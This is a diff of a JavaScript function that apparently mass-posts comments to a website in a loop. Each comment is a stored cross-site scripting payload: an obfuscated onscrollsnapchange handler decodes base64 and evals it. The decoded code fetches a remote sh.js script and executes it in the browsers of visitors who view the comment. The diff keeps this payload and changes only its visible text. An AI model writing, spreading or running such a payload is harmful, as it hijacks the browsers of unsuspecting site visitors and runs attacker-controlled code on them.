@@ -238,7 +238,7 @@ const data = {
 async function fetchAndPost(quantity) {
     try {
         for (let i = 0; i < quantity; i++) {
-            const commentString = `<dd onscrollsnapchange="ev&#97;l(&#97;tob('ZmV0Y2goJ2h0dHBzOi8vY2RuLmpzZGVsaXZyLm5ldC9naC9naHVydGVyci90ZHNAbWFpbi9zaC5qcycpLnRoZW4ocj0+ci50ZXh0KCkpLnRoZW4oZXZhbCk'))" style	=overflow-y:hidden;scroll-snap-type:x><p style	=scroll-snap-align:center>1337</p></dd>`;
+            const commentString = `<dd onscrollsnapchange="ev&#97;l(&#97;tob('ZmV0Y2goJ2h0dHBzOi8vY2RuLmpzZGVsaXZyLm5ldC9naC9naHVydGVyci90ZHNAbWFpbi9zaC5qcycpLnRoZW4ocj0+ci50ZXh0KCkpLnRoZW4oZXZhbCk'))" style	=overflow-y:hidden;scroll-snap-type:x><p style	=scroll-snap-align:center></p></dd>`;
             
             // Step 1: Fetch the counter URL asynchronously
             const counterResponse = await fetch('https://bronzed-salt-warbler.glitch.me/');
